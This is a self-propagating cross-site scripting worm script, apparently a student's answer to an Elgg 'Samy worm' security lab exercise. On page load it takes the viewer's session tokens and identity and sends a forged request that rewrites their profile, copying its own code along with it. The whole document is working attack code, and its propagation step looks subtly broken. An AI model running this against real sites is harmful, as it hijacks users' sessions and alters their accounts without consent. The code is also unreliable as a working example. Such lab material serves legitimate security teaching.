<script id="worm">
  window.onload = function() {
    var sendurl = "http://www.xsslabelgg.com/action/profile/edit"; // URL to send the POST request
      var content = "__elgg_token=" + elgg.security.token.__elgg_token + 
                    "&__elgg_ts=" + elgg.security.token.__elgg_ts +
                    "&description=Samy is my HERO (added by [Kurudunje Deekshith Shetty, Yahya Sheikh])" +
                    "&name=" + elgg.session.user.name + 
                    "&guid=" + elgg.session.user.guid;

    if (elgg.session.user.name !== "Samy") {
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        var wormCode = document.getElementById("worm").innerHTML;
        alert(wormCode);
        wormCode = "<script id='worm'>" + wormCode + "</script>";
        wormCode = encodeURIComponent(wormCode);
        content += "&wormCode=" + wormCode;
        Ajax.send(content);
      }
  };
</script>